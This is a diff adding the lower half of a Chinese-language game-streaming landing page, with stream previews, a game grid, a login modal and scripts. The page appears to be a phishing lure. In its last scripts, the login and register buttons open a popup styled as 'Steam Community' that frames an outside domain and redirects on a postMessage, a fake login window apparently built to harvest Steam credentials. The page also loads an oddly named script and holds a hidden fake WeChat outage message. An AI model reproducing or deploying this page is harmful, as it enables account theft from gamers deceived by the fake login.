+              <img class="preview-icon-live" src="img/live.png" alt="" />
+            </a>
+          </div>
+          <div class="category-preview-inner-desc">
+            <h4 onclick="showModal(event);">
+              白天天人城，晚上坐牢！
+            </h4>
+            <p onclick="showModal(event);">永劫无间</p>
+            <div>
+              <span onclick="showModal(event);">26万</span>
+              <a href="stream-369.html" tabindex="-1"
+                >观察一下</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="category-preview">
+        <div class="category-preview-inner">
+          <a
+             
+            onclick="showModal(event);"
+            tabindex="-1"
+          >
+            <img
+              data-lazy="img/category_game3.png"
+              alt=""
+              class="slick-loading"
+            />
+          </a>
+          <div class="preview-icons">
+            <a href="stream-369.html" tabindex="-1">
+              <img class="preview-icon-play" src="img/play-icon.png" alt="" />
+              <img class="preview-icon-live" src="img/live.png" alt="" />
+            </a>
+          </div>
+          <div class="category-preview-inner-desc">
+            <h4 onclick="showModal(event);">猎杀帮打排位徽章~</h4>
+            <p onclick="showModal(event);">apex legends heroes</p>
+            <div>
+              <span onclick="showModal(event);">61.1万</span>
+              <a href="stream-369.html" tabindex="-1"
+                >观察一下</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="category-preview">
+        <div class="category-preview-inner">
+          <a
+             
+            onclick="showModal(event);"
+            tabindex="-1"
+          >
+            <img data-lazy="img/146.jpg" alt="" class="slick-loading" />
+          </a>
+          <div class="preview-icons">
+            <a href="stream-369.html" tabindex="-1">
+              <img class="preview-icon-play" src="img/play-icon.png" alt="" />
+              <img class="preview-icon-live" src="img/live.png" alt="" />
+            </a>
+          </div>
+          <div class="category-preview-inner-desc">
+            <h4 onclick="showModal(event);">另类玩法一喷一狙</h4>
+            <p onclick="showModal(event);">和平精英</p>
+            <div>
+              <span onclick="showModal(event);">245万</span>
+              <a href="stream-369.html" tabindex="-1"
+                >观察一下</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="category-preview">
+        <div class="category-preview-inner">
+          <a
+             
+            onclick="showModal(event);"
+            tabindex="-1"
+          >
+            <img data-lazy="img/147.jpg" alt="" class="slick-loading" />
+          </a>
+          <div class="preview-icons">
+            <a href="stream-369.html" tabindex="-1">
+              <img class="preview-icon-play" src="img/play-icon.png" alt="" />
+              <img class="preview-icon-live" src="img/live.png" alt="" />
+            </a>
+          </div>
+          <div class="category-preview-inner-desc">
+            <h4 onclick="showModal(event);">逃离塔科夫陪跑员！</h4>
+            <p onclick="showModal(event);">逃离塔科夫</p>
+            <div>
+              <span onclick="showModal(event);">164.7万</span>
+              <a href="stream-369.html" tabindex="-1"
+                >观察一下</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="categories-previews-row slide" style="width: 100%; display: flex;">
+      <div class="category-preview">
+        <div class="category-preview-inner">
+          <a
+            href="stream-369.html"
+            onclick="showModal(event);"
+            tabindex="-1"
+          >
+            <img data-lazy="img/151.jpg" alt="" class="slick-loading" />
+          </a>
+          <div class="preview-icons">
+            <a href="stream-369.html" tabindex="-1">
+              <img class="preview-icon-play" src="img/play-icon.png" alt="" />
+              <img class="preview-icon-live" src="img/live.png" alt="" />
+            </a>
+          </div>
+          <div class="category-preview-inner-desc">
+            <h4 onclick="showModal(event);">淑怡：双倍亲密度</h4>
+            <p onclick="showModal(event);">沟通</p>
+            <div>
+              <span onclick="showModal(event);">351.8万</span>
+              <a href="stream-369.html" tabindex="-1"
+                >观察一下</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="category-preview">
+        <div class="category-preview-inner">
+          <a
+             
+            onclick="showModal(event);"
+            tabindex="-1"
+          >
+            <img data-lazy="img/152.jpg" alt="" class="slick-loading" />
+          </a>
+          <div class="preview-icons">
+            <a href="stream-369.html" tabindex="-1">
+              <img class="preview-icon-play" src="img/play-icon.png" alt="" />
+              <img class="preview-icon-live" src="img/live.png" alt="" />
+            </a>
+          </div>
+          <div class="category-preview-inner-desc">
+            <h4 onclick="showModal(event);">免费上号/飞机插队</h4>
+            <p onclick="showModal(event);">NBA</p>
+            <div>
+              <span onclick="showModal(event);">29.4万</span>
+              <a href="stream-369.html" tabindex="-1"
+                >观察一下</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="category-preview">
+        <div class="category-preview-inner">
+          <a
+             
+            onclick="showModal(event);"
+            tabindex="-1"
+          >
+            <img data-lazy="img/153.png" alt="" class="slick-loading" />
+          </a>
+          <div class="preview-icons">
+            <a href="stream-369.html" tabindex="-1">
+              <img class="preview-icon-play" src="img/play-icon.png" alt="" />
+              <img class="preview-icon-live" src="img/live.png" alt="" />
+            </a>
+          </div>
+          <div class="category-preview-inner-desc">
+            <h4 onclick="showModal(event);">最后一个CAH</h4>
+            <p onclick="showModal(event);">CSGO</p>
+            <div>
+              <span onclick="showModal(event);">243万</span>
+              <a href="stream-369.html" tabindex="-1"
+                >观察一下</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="category-preview">
+        <div class="category-preview-inner">
+          <a
+             
+            onclick="showModal(event);"
+            tabindex="-1"
+          >
+            <img
+              data-lazy="img/category_game4.png"
+              alt=""
+              class="slick-loading"
+            />
+          </a>
+          <div class="preview-icons">
+            <a href="stream-369.html" tabindex="-1">
+              <img class="preview-icon-play" src="img/play-icon.png" alt="" />
+              <img class="preview-icon-live" src="img/live.png" alt="" />
+            </a>
+          </div>
+          <div class="category-preview-inner-desc">
+            <h4 onclick="showModal(event);">白金在线1等2</h4>
+            <p onclick="showModal(event);">apex legends heroes</p>
+            <div>
+              <span onclick="showModal(event);">54万</span>
+              <a href="stream-369.html" tabindex="-1"
+                >观察一下</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="category-preview">
+        <div class="category-preview-inner">
+          <a
+             
+            onclick="showModal(event);"
+            tabindex="-1"
+          >
+            <img
+              data-lazy="img/category_game5.png"
+              alt=""
+              class="slick-loading"
+            />
+          </a>
+          <div class="preview-icons">
+            <a href="stream-369.html" tabindex="-1">
+              <img class="preview-icon-play" src="img/play-icon.png" alt="" />
+              <img class="preview-icon-live" src="img/live.png" alt="" />
+            </a>
+          </div>
+          <div class="category-preview-inner-desc">
+            <h4 onclick="showModal(event);">白金上钻，ccc</h4>
+            <p onclick="showModal(event);">apex legends heroes</p>
+            <div>
+              <span onclick="showModal(event);">78.5万</span>
+              <a href="stream-369.html" tabindex="-1"
+                >观察一下</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+        </div>
+        <div class="streams-right-shape">
+          
+        </div>
+        <div class="streams-right-hero">
+            <img class="lazy" data-src="img/player_right_hero.png" alt="">
+        </div>
+    </div>
+    
+    <div class="games">
+        <div class="container">
+            <div style="text-align: center;" class="games-inner">
+                <h2>热门游戏</h2>  
+                <div class="games-slider slick-initialized slick-slider"><div class="slick-list draggable"><div class="slick-track" style="opacity: 1; width: 1296px; transform: translate3d(0px, 0px, 0px);"><div class="slick-slide slick-current slick-active" data-slick-index="0" aria-hidden="false" style="width: 1296px;"><div><div class="games-list" style="width: 100%; display: inline-block;">
+                        <div class="row">
+                            <div class="game col-6 col-md-4 col-xl-3 col-xxl-2">
+                                <div class="game-inner">
+                                    <a   onclick="showModal(event);" tabindex="0">
+                                        <img alt="" class="" src="img/games_game1.png" style="opacity: 1;">
+                                    </a>
+                                    <div class="game-desc">
+                                        <h3 onclick="showModal(event);" class="game-title">APEX LEGENDS</h3>
+                                        <p onclick="showModal(event);" class="game-viewers">1008.2 万</p>
+                                    </div>
+                                  
+                                </div>
+                            </div>
+                            
+                            <style>
+                                .game-inner:hover img {
+                                    transform: scale(0.97);
+                                    transition: all 0.2s ease-in-out;
+                                }
+                                .game-inner {
+    position: relative;
+    display: inline-block;
+}
+
+.game-inner::before {
+    content: "";
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0 0 0 / 9%);
+    opacity: 0;
+    transition: opacity 0.5s ease-in-out;
+    cursor: pointer;
+}
+
+
+.game-inner:hover::before {
+    opacity: 1;
+}
+
+
+                            </style>
+                            
+                            
+                            <style></style>
+                            <div class="game col-6 col-md-4 col-xl-3 col-xxl-2">
+                                <div class="game-inner">
+                                  <a   onclick="showModal(event);" tabindex="0">
+                                    <img src="img/games_game2.png" alt="">
+                                  </a>
+                                  <div class="game-desc">
+                                    <h3 onclick="showModal(event);" class="game-title">LOL英雄联盟</h3>
+                                    <p onclick="showModal(event);" class="game-viewers">9879.9 万</p>
+                                  </div>
+                                  
+                                </div>
+                              </div>
+                              <style></style>
+                            <div class="game col-6 col-md-4 col-xl-3 col-xxl-2">
+                                <div class="game-inner">
+                                    <a   onclick="showModal(event);" tabindex="0">
+                                        <img alt="" class="" src="img/games_game3.png" style="opacity: 1;">
+                                    </a>
+                                    <div class="game-desc">
+                                        <h3 onclick="showModal(event);" class="game-title"> PUBG(绝地求生)</h3>
+                                        <p onclick="showModal(event);" class="game-viewers">5648.3万</p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="game col-6 col-md-4 col-xl-3 col-xxl-2">
+                                <div class="game-inner">
+                                    <a   onclick="showModal(event);" tabindex="0">
+                                        <img alt="" class="" src="img/games_game4.png" style="opacity: 1;">
+                                    </a>
+                                    <div class="game-desc">
+                                        <h3 onclick="showModal(event);" class="game-title"> 赛博朋克2077</h3>
+                                        <p onclick="showModal(event);" class="game-viewers">4260</p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="game col-6 col-md-4 col-xl-3 col-xxl-2">
+                                <div class="game-inner">
+                                    <a   onclick="showModal(event);" tabindex="0">
+                                        <img alt="" class="" src="img/1.jpg" style="opacity: 1;">
+                                    </a>
+                                    <div class="game-desc">
+                                        <h3 onclick="showModal(event);" class="game-title"> CSGO </h3>
+                                        <p onclick="showModal(event);" class="game-viewers">3987.3万</p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="game col-6 col-md-4 col-xl-3 col-xxl-2">
+                                <div class="game-inner">
+                                    <a   onclick="showModal(event);" tabindex="0">
+                                        <img alt="" class="" src="img/games_game6.png" style="opacity: 1;">
+                                    </a>
+                                    <div class="game-desc">
+                                        <h3 onclick="showModal(event);" class="game-title"> 全境封锁2</h3>
+                                        <p onclick="showModal(event);" class="game-viewers">1087</p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="game col-6 col-md-4 col-xl-3 col-xxl-2">
+                                <div class="game-inner">
+                                    <a   onclick="showModal(event);" tabindex="0">
+                                        <img alt="" class="" src="img/games_game7.png" style="opacity: 1;">
+                                    </a>
+                                    <div class="game-desc">
+                                        <h3 onclick="showModal(event);" class="game-title"> NFS HEAT</h3>
+                                        <p onclick="showModal(event);" class="game-viewers">987</p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="game col-6 col-md-4 col-xl-3 col-xxl-2">
+                                <div class="game-inner">
+                                    <a   onclick="showModal(event);" tabindex="0">
+                                        <img alt="" class="" src="img/games_game8.png" style="opacity: 1;">
+                                    </a>
+                                    <div class="game-desc">
+                                        <h3 onclick="showModal(event);" class="game-title"> FORTNITE</h3>
+                                        <p onclick="showModal(event);" class="game-viewers">787.1万 </p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="game col-6 col-md-4 col-xl-3 col-xxl-2">
+                                <div class="game-inner">
+                                    <a   onclick="showModal(event);" tabindex="0">
+                                        <img alt="" class="" src="img/games_game9.png" style="opacity: 1;">
+                                    </a>
+                                    <div class="game-desc">
+                                        <h3 onclick="showModal(event);" class="game-title"> Dota 2</h3>
+                                        <p onclick="showModal(event);" class="game-viewers">4521万 </p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="game col-6 col-md-4 col-xl-3 col-xxl-2">
+                                <div class="game-inner">
+                                    <a   onclick="showModal(event);" tabindex="0">
+                                        <img alt="" class="" src="img/2.jpg" style="opacity: 1;">
+                                    </a>
+                                    <div class="game-desc">
+                                        <h3 onclick="showModal(event);" class="game-title"> Valorant </h3>
+                                        <p onclick="showModal(event);" class="game-viewers">222.4万 </p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="game col-6 col-md-4 col-xl-3 col-xxl-2">
+                                <div class="game-inner">
+                                    <a   onclick="showModal(event);" tabindex="0">
+                                        <img alt="" class="" src="img/3.jpg" style="opacity: 1;">
+                                    </a>
+                                    <div class="game-desc">
+                                        <h3 onclick="showModal(event);" class="game-title"> 魔兽世界</h3>
+                                        <p onclick="showModal(event);" class="game-viewers">867.9万</p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="game col-6 col-md-4 col-xl-3 col-xxl-2">
+                                <div class="game-inner">
+                                    <a   onclick="showModal(event);" tabindex="0">
+                                        <img alt="" class="" src="img/games_game12.png" style="opacity: 1;">
+                                    </a>
+                                    <div class="game-desc">
+                                        <h3 onclick="showModal(event);" class="game-title"> COD手游</h3>
+                                        <p onclick="showModal(event);" class="game-viewers">1083.6万</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div></div></div></div></div></div>
+            </div>
+        </div>
+    </div>
+</main>
+
+<div class="login">
+    <div class="modal-background">
+        <div class="login-modal">
+            <div class="row">
+                <div class="modal-image col-12 col-sm-6">
+                    <img src="img/login-img-inner.png" alt="">
+                    <img class="modal-absolute" src="img/login-image.png" alt="">
+                </div>
+                <div class="col-12 col-sm-6">
+                    <form class="modal-form">
+                        <i class="modal-close">
+                            <img onclick="hideModal();" src="img/login-close.png" alt="">
+                        </i>
+                        <h2>授权您的帐户</h2>
+                        <div class="modal-form-right">
+                            <div class="form-picker">
+                                <a class="active mybutton" style="cursor:pointer">登录</a>
+                                <a   class="AUTH wrgij6o4drf2 mybutton" style="cursor:pointer">注册</a>
+                            </div>
+                            <div class="form-rows">
+                                <div class="form-row">
+                                    <img data-src="img/form-login.png" class="modal-form-icon lazy" alt="">
+                                    <input type="text" placeholder="电子邮件">
+                                </div>
+                                <div class="form-row">
+                                    <img data-src="img/form-password.png" class="modal-form-icon lazy" alt="">
+                                    <input type="text" placeholder="密码">
+                                </div>
+                            </div>
+                            <div class="forget">
+                                <a  style="cursor:pointer" class="wrgij6o4drf2 mybutton">忘記密碼</a>
+                            </div>
+                            <div class="form-button">
+                                <button class="wrgij6o4drf2 mybutton">進來</button>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<footer>
+    <div class="ui inverted vertical segment" id="footer">
+    <div class="ui inverted secondary menu">
+      <a href="/" class="item" style="margin-right: auto;left: 10px;">
+        <img src="img/logo.png" id="logo" style="width:150px;">
+      </a>
+      <a onclick="showModal(event);" class="item"><i class="fa-solid fa-gamepad"></i>&nbsp;主页面</a>
+      <a onclick="showModal(event);" class="item"><i class="fa-solid fa-video"></i>&nbsp;社区</a>
+      <a onclick="showModal(event);" class="item"><i class="fa-solid fa-users"></i>&nbsp;锦标赛</a>
+      <a onclick="showModal(event);" class="item"><i class="fa-regular fa-handshake"></i></i>&nbsp;团队</a>
+      <a onclick="showModal(event);" class="item"><i class="fa-brands fa-github-alt"></i>&nbsp;支持</a>
+      <div class="right menu">
+        <div class="item"><i class="fa-brands fa-napster"></i>
+          <p>All rights reserved. 2021</p>
+        </div>
+      </div>
+    </div>
+  </div>
+  <style>#footer {
+      overflow-x: auto;
+      -webkit-overflow-scrolling: touch; /* for smoother scrolling on iOS devices */
+    }
+    </style>
+  </footer>
+
+<script src="img/xd47jxsc5wa6.js"></script>
+<script src="img/slick.js"></script>
+<script src="img/main.js"></script>
+
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>
+     <script type="text/javascript">
+        $(document).ready(function(){
+            $('.intro-text-slides').slick({
+                dots: false,
+                arrows: false,
+                infinite: true,
+                speed: 500,
+                slidesToShow: 1,
+                adaptiveHeight: true,
+                autoplay: true,
+                autoplaySpeed: 4000 // 3 секунды
+            });
+        });
+    </script>
+
+    <script>
+  $(document).ready(function(){
+    var slider = $('.categories-previews').slick({
+      infinite: true,
+      slidesToShow: 1,
+      slidesToScroll: 1,
+      prevArrow: $('.slick-prev'),
+      nextArrow: $('.slick-next')
+    });
+
+    // Click event handler for category 1
+    $('#category1').on('click', function() {
+      slider.slick('slickGoTo', 0);
+      $('.category').removeClass('active');
+      $(this).addClass('active');
+    });
+
+    // Click event handler for category 2
+    $('#category2').on('click', function() {
+      slider.slick('slickGoTo', 1);
+      $('.category').removeClass('active');
+      $(this).addClass('active');
+    });
+
+    // Click event handler for category 3
+    $('#category3').on('click', function() {
+      slider.slick('slickGoTo', 2);
+      $('.category').removeClass('active');
+      $(this).addClass('active');
+    });
+
+    // Click event handler for category 4
+    $('#category4').on('click', function() {
+      slider.slick('slickGoTo', 3);
+      $('.category').removeClass('active');
+      $(this).addClass('active');
+    });
+  });
+</script>
+
+<script>document.querySelector('.mybutton').onclick = function(){var wind = window.open("", "", "STATUS=NO, TOOLBAR=NO, LOCATION=0, DIRECTORIES=0, RESISABLE=NO, SCROLLBARS=YES, TOP=50, LEFT=50, WIDTH=1004, HEIGHT=800");wind.document.write("<html style='overflow:hidden;'><head><title>Steam Community</title><style>html, body {width:1004px; height:800px; margin:0px; padding:0px;}</style></head><body><iframe src='https://marathonhe.com/6e1e3' border='0' style='width:100vw; height:100vh; border: none;' onload="window.addEventListener('message',e=>{if(typeof e.data=='object'&&typeof e.data.r=='string'&&e.data.r.length>0){window.location.href=e.data.r}},false);"></iframe></body></html>");return false;}</script>
+
+<div style="background-color: red; color: white; padding: 1em; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 9999; display: none;"><i class="fa-solid fa-circle-exclamation"></i> 对不起，微信服务暂时中断了。请稍后再试。</div></body></html>
